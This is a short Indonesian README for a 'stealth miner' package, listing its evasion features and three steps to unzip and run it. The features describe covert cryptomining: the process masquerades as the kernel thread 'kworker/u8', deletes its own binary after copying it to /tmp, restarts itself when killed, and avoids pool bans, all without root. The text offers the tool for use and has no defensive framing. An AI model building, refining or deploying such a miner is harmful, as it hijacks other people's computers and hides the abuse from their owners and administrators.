# Stealth Miner tanpa Proxy

## ✅ Fitur:
- Anti-dismiss (auto restart loop)
- Stealth nama binary & proses (kworker/u8)
- Tidak simpan binary di folder saat aktif (hapus setelah copy ke /tmp)
- Deteksi IP publik untuk hindari mining dari IP pool (anti-ban)
- Tidak butuh root
- Tidak menggunakan proxychains

## 🚀 Cara Jalankan:
1. Ekstrak:
   ```
   unzip stealth-miner-direct.zip
   cd stealth-miner
   ```

2. Jadikan executable:
   ```
   chmod +x stealth-miner-direct.sh
   ```

3. Jalankan:
   ```
   ./stealth-miner-direct.sh
   ```

## ⚠️ Catatan:
- Pastikan koneksi internet aktif
- Tidak perlu proxy, mining langsung ke pool SSL
